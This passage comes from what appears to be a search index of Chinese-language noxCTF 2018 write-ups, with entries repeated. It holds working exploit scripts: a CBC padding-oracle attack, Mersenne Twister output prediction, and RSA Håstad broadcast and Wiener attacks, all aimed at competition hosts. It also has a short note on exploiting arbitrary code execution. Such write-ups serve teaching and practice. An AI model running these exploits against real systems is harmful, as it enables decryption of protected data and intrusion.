or length <= 16 ): client . close () break else : ciphertext = client . recv ( length ) plaintext = self . decrypt ( ciphertext ) if self . check_pad ( plaintext ): client . send ( '1' ) else : client . send ( '0' ) except Exception as e : print e client . close () return False if __name__ == \"__main__\" : ThreadedServer ( '0.0.0.0' , 3141 ) . listen () \u5178\u578b\u7684padding oracle\u653b\u51fb\uff0c\u53ef\u4ee5\u4f7f\u7528 https://github.com/mwielgoszewski/python-paddingoracle \u6765\u6c42\u89e3\uff0c\u9700\u8981\u6539\u5199\u4e0bPadBuster()\u65b9\u6cd5\u3002 exp.py from paddingoracle import BadPaddingException , PaddingOracle from pwn import * r = remote ( 'chal.noxale.com' , 3141 ) with open ( 'Encrypted.txt' , 'rb' ) as f : data = f . read () iv = data [: 16 ] cipher = data [ 16 :] class PadBuster ( PaddingOracle ): def __init__ ( self , ** kwargs ): super ( PadBuster , self ) . __init__ ( ** kwargs ) def oracle ( self , data , ** kwargs ): r . send ( bytes ( 48 )) r . send ( iv + data ) if r . recv ( 1 ) == '0' : raise BadPaddingException padbuster = PadBuster () value = padbuster . decrypt ( cipher , block_size = 16 , iv = iv ) print ( 'Decrypted: %r ' % ( value ))","title":"Java_Corporation"},{"location":"noxCTF2018/crypto/Java_Corporation/writeup/#java_corporation","text":"given_server.py: import socket import threading import random from Crypto.Cipher import AES key = 'NotGonnaHappen' class ThreadedServer ( object ): def __init__ ( self , host , port ): self . host = host self . port = port self . sock = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) self . sock . setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) self . sock . bind (( self . host , self . port )) def listen ( self ): self . sock . listen ( 20 ) while True : client , address = self . sock . accept () client . settimeout ( 60 ) threading . Thread ( target = self . listenToClient , args = ( client , address )) . start () def getIV ( self ): return '' . join ([ chr ( random . randrange ( 0 , 256 )) for i in range ( 16 )]) def encrypt ( self , plaintext ): iv = self . getIV () aes = AES . new ( key , AES . MODE_CBC , iv ) return iv + aes . encrypt ( plaintext ) def decrypt ( self , ciphertext ): aes = AES . new ( key , AES . MODE_CBC , ciphertext [: 16 ]) return aes . decrypt ( ciphertext [ 16 :]) def pkcs5 ( self , s ): pad_len = (( - len ( s )) % 16 ) if pad_len == 0 : pad_len = 16 return s + chr ( pad_len ) * pad_len def check_pad ( self , s ): pad_len = ord ( s [ - 1 ]) if pad_len > 16 or pad_len == 0 : return False pad = s [ - pad_len :] for byte in pad : if ord ( byte ) != pad_len : return False return True def listenToClient ( self , client , address ): while True : try : length = int ( client . recv ( 2 )) if ( length % 16 != 0 or length <= 16 ): client . close () break else : ciphertext = client . recv ( length ) plaintext = self . decrypt ( ciphertext ) if self . check_pad ( plaintext ): client . send ( '1' ) else : client . send ( '0' ) except Exception as e : print e client . close () return False if __name__ == \"__main__\" : ThreadedServer ( '0.0.0.0' , 3141 ) . listen () \u5178\u578b\u7684padding oracle\u653b\u51fb\uff0c\u53ef\u4ee5\u4f7f\u7528 https://github.com/mwielgoszewski/python-paddingoracle \u6765\u6c42\u89e3\uff0c\u9700\u8981\u6539\u5199\u4e0bPadBuster()\u65b9\u6cd5\u3002 exp.py from paddingoracle import BadPaddingException , PaddingOracle from pwn import * r = remote ( 'chal.noxale.com' , 3141 ) with open ( 'Encrypted.txt' , 'rb' ) as f : data = f . read () iv = data [: 16 ] cipher = data [ 16 :] class PadBuster ( PaddingOracle ): def __init__ ( self , ** kwargs ): super ( PadBuster , self ) . __init__ ( ** kwargs ) def oracle ( self , data , ** kwargs ): r . send ( bytes ( 48 )) r . send ( iv + data ) if r . recv ( 1 ) == '0' : raise BadPaddingException padbuster = PadBuster () value = padbuster . decrypt ( cipher , block_size = 16 , iv = iv ) print ( 'Decrypted: %r ' % ( value ))","title":"Java_Corporation"},{"location":"noxCTF2018/crypto/Plot_Twist/writeup/","text":"Plot_Twist \u00b6 python\u9884\u6d4b\u4f2a\u968f\u673a\u6570\u3002 \u4f7f\u7528MTRecover: https://github.com/eboda/mersenne-twister-recover MTRecover.py import random class MT19937Recover : \"\"\"Reverses the Mersenne Twister based on 624 observed outputs. The internal state of a Mersenne Twister can be recovered by observing 624 generated outputs of it. However, if those are not directly observed following a twist, another output is required to restore the internal index. See also https://en.wikipedia.org/wiki/Mersenne_Twister#Pseudocode . \"\"\" def unshiftRight ( self , x , shift ): res = x for i in range ( 32 ): res = x ^ res >> shift return res def unshiftLeft ( self , x , shift , mask ): res = x for i in range ( 32 ): res = x ^ ( res << shift & mask ) return res def untemper ( self , v ): \"\"\" Reverses the tempering which is applied to outputs of MT19937 \"\"\" v = self . unshiftRight ( v , 18 ) v = self . unshiftLeft ( v , 15 , 0xefc60000 ) v = self . unshiftLeft ( v , 7 , 0x9d2c5680 ) v = self . unshiftRight ( v , 11 ) return v def go ( self , outputs , forward = True ): \"\"\"Reverses the Mersenne Twister based on 624 observed values. Args: outputs (List[int]): list of >= 624 observed outputs from the PRNG. However, >= 625 outputs are required to correctly recover the internal index. forward (bool): Forward internal state until all observed outputs are generated. Returns: Returns a random.Random() object. \"\"\" result_state = None assert len ( outputs ) >= 624 # need at least 624 values ivals = [] for i in range ( 624 ): ivals . append ( self . untemper ( outputs [ i ])) if len ( outputs ) >= 625 : # We have additional outputs and can correctly # recover the internal index by bruteforce challenge = outputs [ 624 ] for i in range ( 1 , 626 ): state = ( 3 , tuple ( ivals + [ i ]), None ) r = random . Random () r . setstate ( state ) if challenge == r . getrandbits ( 32 ): result_state = state break else : # With only 624 outputs we assume they were the first observed 624 # outputs after a twist --> we set the internal index to 624. result_state = ( 3 , tuple ( ivals + [ 624 ]), None ) rand = random . Random () rand . setstate ( result_state ) if forward : for i in range ( 624 , len ( outputs )): assert rand . getrandbits ( 32 ) == outputs [ i ] return rand def test_PythonMT19937Recover (): \"\"\"Just a testcase to ensure correctness\"\"\" mtb = MT19937Recover () r1 = random . Random ( 0x31337 ) # just some discarded random numbers to move internal state forward [ r1 . getrandbits ( 32 ) for _ in range ( 1234 )] # the actual leak of 1000 values n = [ r1 . getrandbits ( 32 ) for _ in range ( 1000 )] r2 = mtb . go ( n ) assert r1 . getrandbits ( 32 ) == r2 . getrandbits ( 32 ) test_PythonMT19937Recover () exp.py from __future__ import print_function from pwn import * from MTRecover import MT19937Recover r = remote ( 'chal.noxale.com' , 5115 ) r . recvline () to_send = '0' * 16 bits = [] for i in range ( 625 ): r . send ( to_send ) for i in range ( 625 ): key = r . recvuntil ( 'key: \\n ' ) . split ()[ 4 ] bits . append ( int ( key )) mtb = MT19937Recover () rand = mtb . go ( bits ) to_send = str ( rand . getrandbits ( 32 )) . rjust ( 16 , '0' ) r . send ( to_send ) print ( r . recv ())","title":"Plot_Twist"},{"location":"noxCTF2018/crypto/Plot_Twist/writeup/#plot_twist","text":"python\u9884\u6d4b\u4f2a\u968f\u673a\u6570\u3002 \u4f7f\u7528MTRecover: https://github.com/eboda/mersenne-twister-recover MTRecover.py import random class MT19937Recover : \"\"\"Reverses the Mersenne Twister based on 624 observed outputs. The internal state of a Mersenne Twister can be recovered by observing 624 generated outputs of it. However, if those are not directly observed following a twist, another output is required to restore the internal index. See also https://en.wikipedia.org/wiki/Mersenne_Twister#Pseudocode . \"\"\" def unshiftRight ( self , x , shift ): res = x for i in range ( 32 ): res = x ^ res >> shift return res def unshiftLeft ( self , x , shift , mask ): res = x for i in range ( 32 ): res = x ^ ( res << shift & mask ) return res def untemper ( self , v ): \"\"\" Reverses the tempering which is applied to outputs of MT19937 \"\"\" v = self . unshiftRight ( v , 18 ) v = self . unshiftLeft ( v , 15 , 0xefc60000 ) v = self . unshiftLeft ( v , 7 , 0x9d2c5680 ) v = self . unshiftRight ( v , 11 ) return v def go ( self , outputs , forward = True ): \"\"\"Reverses the Mersenne Twister based on 624 observed values. Args: outputs (List[int]): list of >= 624 observed outputs from the PRNG. However, >= 625 outputs are required to correctly recover the internal index. forward (bool): Forward internal state until all observed outputs are generated. Returns: Returns a random.Random() object. \"\"\" result_state = None assert len ( outputs ) >= 624 # need at least 624 values ivals = [] for i in range ( 624 ): ivals . append ( self . untemper ( outputs [ i ])) if len ( outputs ) >= 625 : # We have additional outputs and can correctly # recover the internal index by bruteforce challenge = outputs [ 624 ] for i in range ( 1 , 626 ): state = ( 3 , tuple ( ivals + [ i ]), None ) r = random . Random () r . setstate ( state ) if challenge == r . getrandbits ( 32 ): result_state = state break else : # With only 624 outputs we assume they were the first observed 624 # outputs after a twist --> we set the internal index to 624. result_state = ( 3 , tuple ( ivals + [ 624 ]), None ) rand = random . Random () rand . setstate ( result_state ) if forward : for i in range ( 624 , len ( outputs )): assert rand . getrandbits ( 32 ) == outputs [ i ] return rand def test_PythonMT19937Recover (): \"\"\"Just a testcase to ensure correctness\"\"\" mtb = MT19937Recover () r1 = random . Random ( 0x31337 ) # just some discarded random numbers to move internal state forward [ r1 . getrandbits ( 32 ) for _ in range ( 1234 )] # the actual leak of 1000 values n = [ r1 . getrandbits ( 32 ) for _ in range ( 1000 )] r2 = mtb . go ( n ) assert r1 . getrandbits ( 32 ) == r2 . getrandbits ( 32 ) test_PythonMT19937Recover () exp.py from __future__ import print_function from pwn import * from MTRecover import MT19937Recover r = remote ( 'chal.noxale.com' , 5115 ) r . recvline () to_send = '0' * 16 bits = [] for i in range ( 625 ): r . send ( to_send ) for i in range ( 625 ): key = r . recvuntil ( 'key: \\n ' ) . split ()[ 4 ] bits . append ( int ( key )) mtb = MT19937Recover () rand = mtb . go ( bits ) to_send = str ( rand . getrandbits ( 32 )) . rjust ( 16 , '0' ) r . send ( to_send ) print ( r . recv ())","title":"Plot_Twist"},{"location":"noxCTF2018/crypto/Trinity/writeup/","text":"Trinity \u00b6 \u9898\u76ee\u7ed9\u51fa: N = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004 ccc = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242 \u5178\u578b\u7684RSA\u5e7f\u64ad\u653b\u51fb\uff0c\u4f46\u9700\u8981\u6ce8\u610f\u5230\u8fd9\u91cc\u7684N\u548cc\u90fd\u662f\u4f7f\u7528\u76845\u8fdb\u5236\u8868\u793a\u7684\uff0c\u6240\u4ee5\u9700\u8981\u8f6c\u6362\u4e00\u4e0b\u3002 exp.py from crypto_commons.rsa.rsa_commons import hastad_broadcast from Crypto.Util.number import * n1 = \"331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004\" c1 = \"310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243\" n2 = \"302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114\" c2 = \"112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344\" n3 = \"332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323\" c3 = \"10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242\" n1 = int(n1, 5) n2 = int(n2, 5) n3 = int(n3, 5) c1 = int(c1, 5) c2 = int(c2, 5) c3 = int(c3, 5) print(long_to_bytes(hastad_broadcast([(c1, n1), (c2, n2), (c3, n3)]))) crypto_commons: https://github.com/p4-team/crypto-commons","title":"Trinity"},{"location":"noxCTF2018/crypto/Trinity/writeup/#trinity","text":"\u9898\u76ee\u7ed9\u51fa: N = 331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004 ccc = 10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242 \u5178\u578b\u7684RSA\u5e7f\u64ad\u653b\u51fb\uff0c\u4f46\u9700\u8981\u6ce8\u610f\u5230\u8fd9\u91cc\u7684N\u548cc\u90fd\u662f\u4f7f\u7528\u76845\u8fdb\u5236\u8868\u793a\u7684\uff0c\u6240\u4ee5\u9700\u8981\u8f6c\u6362\u4e00\u4e0b\u3002 exp.py from crypto_commons.rsa.rsa_commons import hastad_broadcast from Crypto.Util.number import * n1 = \"331310324212000030020214312244232222400142410423413104441140203003243002104333214202031202212403400220031202142322434104143104244241214204444443323000244130122022422310201104411044030113302323014101331214303223312402430402404413033243132101010422240133122211400434023222214231402403403200012221023341333340042343122302113410210110221233241303024431330001303404020104442443120130000334110042432010203401440404010003442001223042211442001413004\" c1 = \"310020004234033304244200421414413320341301002123030311202340222410301423440312412440240244110200112141140201224032402232131204213012303204422003300004011434102141321223311243242010014140422411342304322201241112402132203101131221223004022003120002110230023341143201404311340311134230140231412201333333142402423134333211302102413111111424430032440123340034044314223400401224111323000242234420441240411021023100222003123214343030122032301042243\" n2 = \"302240000040421410144422133334143140011011044322223144412002220243001141141114123223331331304421113021231204322233120121444434210041232214144413244434424302311222143224402302432102242132244032010020113224011121043232143221203424243134044314022212024343100042342002432331144300214212414033414120004344211330224020301223033334324244031204240122301242232011303211220044222411134403012132420311110302442344021122101224411230002203344140143044114\" c2 = \"112200203404013430330214124004404423210041321043000303233141423344144222343401042200334033203124030011440014210112103234440312134032123400444344144233020130110134042102220302002413321102022414130443041144240310121020100310104334204234412411424420321211112232031121330310333414423433343322024400121200333330432223421433344122023012440013041401423202210124024431040013414313121123433424113113414422043330422002314144111134142044333404112240344\" n3 = \"332200324410041111434222123043121331442103233332422341041340412034230003314420311333101344231212130200312041044324431141033004333110021013020140020011222012300020041342040004002220210223122111314112124333211132230332124022423141214031303144444134403024420111423244424030030003340213032121303213343020401304243330001314023030121034113334404440421242240113103203013341231330004332040302440011324004130324034323430143102401440130242321424020323\" c3 = \"10013444120141130322433204124002242224332334011124210012440241402342100410331131441303242011002101323040403311120421304422222200324402244243322422444414043342130111111330022213203030324422101133032212042042243101434342203204121042113212104212423330331134311311114143200011240002111312122234340003403312040401043021433112031334324322123304112340014030132021432101130211241134422413442312013042141212003102211300321404043012124332013240431242\" n1 = int(n1, 5) n2 = int(n2, 5) n3 = int(n3, 5) c1 = int(c1, 5) c2 = int(c2, 5) c3 = int(c3, 5) print(long_to_bytes(hastad_broadcast([(c1, n1), (c2, n2), (c3, n3)]))) crypto_commons: https://github.com/p4-team/crypto-commons","title":"Trinity"},{"location":"noxCTF2018/crypto/WTF/writeup/","text":"WTF \u00b6 RSA\u7684wiener attack\u653b\u51fb\uff0c\u4f46\u9700\u8981\u5148\u75281337\u89e3\u7801\u4e00\u4e0b exp.py import gmpy2 from Crypto.Util.number import * n = 'lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg' e = 'lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT' c = 'SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb' lookup = ['O', 'l', 'Z', 'E', 'A', 'S', 'b', 'T', 'B', 'g'] def decode(x): ans = '' for c in x: ans += str(lookup.index(c)) return int(ans) n = decode(n) e = decode(e) c = decode(c) def cf_expansion(n, d): e = [] q = n // d r = n % d e.append(q) while r != 0: n, d = d, r q = n // d r = n % d e.append(q) return e def convergents(e): n = [] # Nominators d = [] # Denominators for i in range(len(e)): if i == 0: ni = e[i] di = 1 elif i == 1: ni = e[i]*e[i-1] + 1 di = e[i] else: # i > 1 ni = e[i]*n[i-1] + n[i-2] di = e[i]*d[i-1] + d[i-2] n.append(ni) d.append(di) yield (ni, di) def solve(b, c): k = b * b - 4 * 1 * c if k < 0: return [] sk, complete = gmpy2.iroot(k, 2) if not complete: return [] return [int((-b + sk) // 2), int((-b - sk) // 2)] def wiener(e, n): kd = convergents(cf_expansion(e, n)) for i, (k, d) in enumerate(kd): if k == 0: continue phi = (e * d - 1) // k roots = solve(phi - n - 1, n) if len(roots) == 2: p, q = roots if p * q == n: return (p, q) p, q = wiener(e, n) r = (p - 1) * (q - 1) d = inverse(e, r) m = pow(c, d, n) print(long_to_bytes(m))","title":"WTF"},{"location":"noxCTF2018/crypto/WTF/writeup/#wtf","text":"RSA\u7684wiener attack\u653b\u51fb\uff0c\u4f46\u9700\u8981\u5148\u75281337\u89e3\u7801\u4e00\u4e0b exp.py import gmpy2 from Crypto.Util.number import * n = 'lObAbAbSBlZOOEBllOEbblTlOAbOlTSBATZBbOSAEZTZEAlSOggTggbTlEgBOgSllEEOEZZOSSAOlBlAgBBBBbbOOSSTOTEOllbZgElgbZSZbbSTTOEBZZSBBEEBTgESEgAAAlAOAEbTZBZZlOZSOgBAOBgOAZEZbOBZbETEOSBZSSElSSZlbBSgbTBOTBSBBSOZOAEBEBZEZASbOgZBblbblTSbBTObAElTSTOlSTlATESEEbSTBOlBlZOlAOETAZAgTBTSAEbETZOlElBEESObbTOOlgAZbbOTBOBEgAOBAbZBObBTg' e = 'lBlbSbTASTTSZTEASTTEBOOAEbEbOOOSBAgABTbZgSBAZAbBlBBEAZlBlEbSSSETAlSOlAgAOTbETAOTSZAZBSbOlOOZlZTETAOSSSlTZOElOOABSZBbZTSAZSlASTZlBBEbEbOEbSTAZAZgAgTlOTSEBEAlObEbbgZBlgOEBTBbbSZAZBBSSZBOTlTEAgBBSZETAbBgEBTATgOZBTllOOSSTlSSTOSSZSZAgSZATgbSOEOTgTTOAABSZEZBEAZBOOTTBSgSZTZbOTgZTTElSOATOAlbBZTBlOTgOSlETgTBOglgETbT' c = 'SOSBOEbgOZTZBEgZAOSTTSObbbbTOObETTbBAlOSBbABggTOBSObZBbbggggZZlbBblgEABlATBESZgASBbOZbASbAAOZSSgbAOZlEgTAlgblBTbBSTAEBgEOEbgSZgSlgBlBSZOObSlgAOSbbOOgEbllAAZgBATgEAZbBEBOAAbZTggbOEZSSBOOBZZbAAlTBgBOglTSSESOTbbSlTAZATEOZbgbgOBZBBBBTBTOSBgEZlOBTBSbgbTlZBbbOBbTSbBASBTlglSEAEgTOSOblAbEgBAbOlbOETAEZblSlEllgTTbbgb' lookup = ['O', 'l', 'Z', 'E', 'A', 'S', 'b', 'T', 'B', 'g'] def decode(x): ans = '' for c in x: ans += str(lookup.index(c)) return int(ans) n = decode(n) e = decode(e) c = decode(c) def cf_expansion(n, d): e = [] q = n // d r = n % d e.append(q) while r != 0: n, d = d, r q = n // d r = n % d e.append(q) return e def convergents(e): n = [] # Nominators d = [] # Denominators for i in range(len(e)): if i == 0: ni = e[i] di = 1 elif i == 1: ni = e[i]*e[i-1] + 1 di = e[i] else: # i > 1 ni = e[i]*n[i-1] + n[i-2] di = e[i]*d[i-1] + d[i-2] n.append(ni) d.append(di) yield (ni, di) def solve(b, c): k = b * b - 4 * 1 * c if k < 0: return [] sk, complete = gmpy2.iroot(k, 2) if not complete: return [] return [int((-b + sk) // 2), int((-b - sk) // 2)] def wiener(e, n): kd = convergents(cf_expansion(e, n)) for i, (k, d) in enumerate(kd): if k == 0: continue phi = (e * d - 1) // k roots = solve(phi - n - 1, n) if len(roots) == 2: p, q = roots if p * q == n: return (p, q) p, q = wiener(e, n) r = (p - 1) * (q - 1) d = inverse(e, r) m = pow(c, d, n) print(long_to_bytes(m))","title":"WTF"},{"location":"noxCTF2018/misc/Blind_Date/writeup/","text":"Blind Date \u00b6 \u7ed9\u7684\u9898\u76ee\u9644\u4ef6\u6253\u4e0d\u5f00\uff0c\u7528HexEditor\u6253\u5f00\u540e\u4ed4\u7ec6\u770b\u4e86\u770b\uff0c\u53d1\u73b0\u4e86\u70b9\u7aef\u502a \u56fe\u7247\u540e\u7f00\u662fjpeg\uff0c\u90a3\u4e48\u8fd9\u4e2a\u6587\u4ef6\u5934\u5e94\u8be5\u662fJFIF\uff0c\u800c\u4e14\u786e\u5b9e\u770b\u5230\u6709JFIF\u5b57\u6837\uff0c\u4f46\u662f\u4f4d\u7f6e\u5f88\u5947\u602a \u6b63\u5e38\u56fe\u7247\u7684\u6587\u4ef6\u5934\u5e94\u8be5\u662f FFD8FFE0 \uff0c\u800c\u8fd9\u4e2a\u5374\u662f E0FFD8FF \u597d\u50cf\u662f\u53cd\u8fc7\u6765\u4e86\uff1f \u4e8e\u662f\u5199\u4e86\u4e2a\u811a\u672c\u9a8c\u8bc1\u731c\u6d4b\uff0c\u5c06\u5176\u4e2d\u7684\u987a\u5e8f\u90fd\u5012\u5e8f\u4e86\u4e00\u904d\uff0c\u5f97\u5230\u4e86\u4e00\u5f20\u80fd\u6b63\u5e38\u6253\u5f00\u7684\u56fe\u7247 \u770b\u5230\u6234\u7740\u58a8\u955c\uff0c\u9898\u76ee\u540d\u4e3aBlind\uff0c\u731c\u5230\u4f1a\u4e0d\u4f1a\u662f\u6709\u76f2\u6587\uff0cbinwalk\u53ef\u4ee5\u5206\u89e3\u51fa\u6765\u4e00\u4e2azip\u5305\uff0c\u4f46\u662f\u6709\u7206\u7834\u4e0d\u51fa\u6765\u7684\u5bc6\u7801\uff0c\u95ee\u4e86\u7ba1\u7406\u5458\u8bf4\u662f\u4e0d\u9700\u8981\u7206\u7834\uff0c\u5e94\u8be5\u662f\u5ffd\u7565\u4e86\u4ec0\u4e48\u4fe1\u606f\uff0c\u4e8e\u662f\u770b\u5230\u56fe\u7247\u5185\u5bb9\uff0c\u4f1a\u53d1\u73b0\u6709\u4e00\u4e32\u5947\u602a\u7684\u5b57\u7b26\u4e32 \u89e3Base64\u540e\u53d1\u73b0\u5c31\u662f\u76f2\u6587 \u5bf9\u7167\u7740\u76f2\u6587\u8868\u5f97\u5230 f4c3p4lm \uff0c\u4f5c\u4e3a\u89e3\u538b\u5bc6\u7801\u89e3\u5f00\u5206\u89e3\u51fa\u6765\u7684zip(\u89e3\u4e0d\u5f00\uff0c\u628a\u5b57\u6bcd\u6362\u6210\u5927\u5199\u624d\u80fd\u89e3\u5f00\u3002\u3002)\uff0c\u5176\u4e2dflag.txt\u5185\u5bb9\u662fbrainfuck\uff0c\u968f\u4fbf\u627e\u4e2a\u89e3\u91ca\u5668\u5f97\u5230flag","title":"Blind Date"},{"location":"noxCTF2018/misc/Blind_Date/writeup/#blind-date","text":"\u7ed9\u7684\u9898\u76ee\u9644\u4ef6\u6253\u4e0d\u5f00\uff0c\u7528HexEditor\u6253\u5f00\u540e\u4ed4\u7ec6\u770b\u4e86\u770b\uff0c\u53d1\u73b0\u4e86\u70b9\u7aef\u502a \u56fe\u7247\u540e\u7f00\u662fjpeg\uff0c\u90a3\u4e48\u8fd9\u4e2a\u6587\u4ef6\u5934\u5e94\u8be5\u662fJFIF\uff0c\u800c\u4e14\u786e\u5b9e\u770b\u5230\u6709JFIF\u5b57\u6837\uff0c\u4f46\u662f\u4f4d\u7f6e\u5f88\u5947\u602a \u6b63\u5e38\u56fe\u7247\u7684\u6587\u4ef6\u5934\u5e94\u8be5\u662f FFD8FFE0 \uff0c\u800c\u8fd9\u4e2a\u5374\u662f E0FFD8FF \u597d\u50cf\u662f\u53cd\u8fc7\u6765\u4e86\uff1f \u4e8e\u662f\u5199\u4e86\u4e2a\u811a\u672c\u9a8c\u8bc1\u731c\u6d4b\uff0c\u5c06\u5176\u4e2d\u7684\u987a\u5e8f\u90fd\u5012\u5e8f\u4e86\u4e00\u904d\uff0c\u5f97\u5230\u4e86\u4e00\u5f20\u80fd\u6b63\u5e38\u6253\u5f00\u7684\u56fe\u7247 \u770b\u5230\u6234\u7740\u58a8\u955c\uff0c\u9898\u76ee\u540d\u4e3aBlind\uff0c\u731c\u5230\u4f1a\u4e0d\u4f1a\u662f\u6709\u76f2\u6587\uff0cbinwalk\u53ef\u4ee5\u5206\u89e3\u51fa\u6765\u4e00\u4e2azip\u5305\uff0c\u4f46\u662f\u6709\u7206\u7834\u4e0d\u51fa\u6765\u7684\u5bc6\u7801\uff0c\u95ee\u4e86\u7ba1\u7406\u5458\u8bf4\u662f\u4e0d\u9700\u8981\u7206\u7834\uff0c\u5e94\u8be5\u662f\u5ffd\u7565\u4e86\u4ec0\u4e48\u4fe1\u606f\uff0c\u4e8e\u662f\u770b\u5230\u56fe\u7247\u5185\u5bb9\uff0c\u4f1a\u53d1\u73b0\u6709\u4e00\u4e32\u5947\u602a\u7684\u5b57\u7b26\u4e32 \u89e3Base64\u540e\u53d1\u73b0\u5c31\u662f\u76f2\u6587 \u5bf9\u7167\u7740\u76f2\u6587\u8868\u5f97\u5230 f4c3p4lm \uff0c\u4f5c\u4e3a\u89e3\u538b\u5bc6\u7801\u89e3\u5f00\u5206\u89e3\u51fa\u6765\u7684zip(\u89e3\u4e0d\u5f00\uff0c\u628a\u5b57\u6bcd\u6362\u6210\u5927\u5199\u624d\u80fd\u89e3\u5f00\u3002\u3002)\uff0c\u5176\u4e2dflag.txt\u5185\u5bb9\u662fbrainfuck\uff0c\u968f\u4fbf\u627e\u4e2a\u89e3\u91ca\u5668\u5f97\u5230flag","title":"Blind Date"},{"location":"noxCTF2018/misc/Python_for_fun/writeup/","text":"Python for fun \u00b6 \u6d4f\u89c8\u6574\u7ad9\uff0c\u5728 match_signature_to_body \u8fd9\u4e2a\u529f\u80fd\u6709\u7528\u6237\u4ea4\u4e92\uff0c\u6d4b\u8bd5\u540e\u53d1\u73b0\u8fd9\u91cc\u53ef\u4ee5\u4efb\u610f\u4ee3\u7801\u6267\u884c\uff0c\u800c\u4e14\u6ca1\u6709\u8fc7\u6ee4\uff0c\u6240\u4ee5\u76f4\u63a5\u5c31\u53ef\u4ee5import os\u6765\u8fdb\u884c\u7cfb\u7edf\u547d\u4ee4\u6267\u884c \u7136\u540e cat FLAG \u5f97\u5230flag","title":"Python_for_fun"},{"location":"noxCTF2018/misc/Python_for_fun/writeup/#python-for-fun","text":"\u6d4f\u89c8\u6574\u7ad9\uff0c\u5728 match_signature_to_body \u8fd9\u4e2a\u529f\u80fd\u6709\u7528\u6237\u4ea4\u4e92\uff0c\u6d4b\u8bd5\u540e\u53d1\u73b0\u8fd9\u91cc\u53ef\u4ee5\u4efb\u610f\u4ee3\u7801\u6267\u884c\uff0c\u800c\u4e14\u6ca1\u6709\u8fc7\u6ee4\uff0c\u6240\u4ee5\u76f4\u63a5\u5c31\u53ef\u4ee5import os\u6765\u8fdb\u884c\u7cfb\u7edf\u547d\u4ee4\u6267\u884c \u7136\u540e cat FLAG \u5f97\u5230flag","title":"Python for fun"},{"location":"noxCTF2018/misc/Python_for_fun_2/writeup/","text":"Python for fun 2 \u00b6 \u8f83\u4e8epython for 